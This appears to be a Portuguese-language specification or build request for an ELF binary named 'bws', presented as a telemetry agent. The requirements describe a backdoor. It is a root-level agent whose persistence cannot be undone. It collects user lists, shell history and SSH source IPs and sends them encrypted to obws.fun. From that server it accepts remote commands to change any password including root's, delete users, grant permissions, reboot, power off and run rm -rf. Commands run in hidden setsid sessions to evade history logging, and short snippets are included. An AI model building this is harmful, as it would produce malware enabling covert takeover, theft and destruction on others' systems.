# CRIAR BINARIO bws 
- deve ser assinado com sha256 - depois de ativado uma (1x) não pode mais desativar, nem mesmo com reboot do sistema operacional!
- o binário: bws - deve ser persistente.
- o binário deve ser um agent de coleta, e telemetrya do sistema operacional!
- o binário não deve usar ferramentas instaladas, mas apenas: bash, sh, curl e wget ou simulares!
- o binário não deve onter: rsdenck
- o binário deve usar o o curl para algumas operacoes:
- o binário NÃO EVE TER: DENCK_KEY - caso tenho chave deve ser: osbin= 
- o binário deve coletar dados como: lista de usuários e permissões, history, todos os ips que conectaram via ssh nele (ssh monitoring advanced), alterar credenciais de qualquer user, inclusive do root, via (server: obws.fun)
remover user, altered password, add permissions a qualquer user, etc! o binário deve ser (MAIS PODEROSO QUE O AGENT DO ZABBIX) E MAIS SEMALHANTE AO QUE O SALTSTACK FAZ, PODENDO ALTERAR REMOTAMENTE NO SISTEMA OPERACIONAL
- do servidor: obws.fun -> deve ser possível reboot no servidor remoto -> via push, poweroff -> via push, executar (rm -rf -> via push) os comandos executados pelo binário devem ser sempre usando sessões ocutas, e temporarias independentes, de modo a não registrar no *history)
- exmeplos:
Isso cria uma nova sessão (SID) e um novo grupo de processos.

Verificando:

echo "PID=$$ SID=$(ps -o sid= -p $$)"
Executar comandos temporariamente
setsid bash -c '
echo "Nova sessão"
sleep 60
'
--
- EXEMPLOS APENAS:
system("curl -X POST https://api.exemplo.com");
---
execl("/usr/bin/curl", "curl", "-X", "POST",
      "https://api.exemplo.com", NULL);
---- o binario deve fazer (push) para: 



# CENÁRIO:
Agente/Binário
     |
     |  dados criptografados
     v
https://obws.fun
     |
     |  somente aqui existe a chave privada
     v
Leitura dos dados
-----------------------
# O QUE NÃO PODE OCORRER:
Se o binário estiver em Bash e contiver:

PUBLIC_KEY="...."

isso não é um problema.

Porém, se ele contiver:

PRIVATE_KEY="...."

aí seria um problema, porque qualquer cliente poderia extrair a chave.
-----------------------
# CRIPTOGRAFIA:
Use:

X25519 + AES-256-GCM

ou

RSA-4096 + AES-256-GCM

Hoje eu escolheria:

X25519 + AES-256-GCM
-------------------
O BINARIO DEVE SER ELF -> COMPILADO!
- E DENTRO DELE DEVE TER A CHAVE .PUB (PORÉM OCUTADA) NENHUM USUÁRIO MALICIOSO PODE CONSEGUIR LER E ROUBAR MINHA LINCENÇA!
- O SERVIDOR: https://obws.fun/ ->  RCEEBE OS DADOS VINDOS DO BINARIO! DADOS SÃO ENVIADOS VIA PUSH ( E DEVEM SER FEITOS APENAS UMA VEZ POR SEMANA!
- O BINARIO DEVE TER PERMISSÃO DE ROOT, PARA COLETAR MÉTRICAS COMPLETAS! E ENVIAR EM FORMATO JSON CRITPGRAFADO
----------------
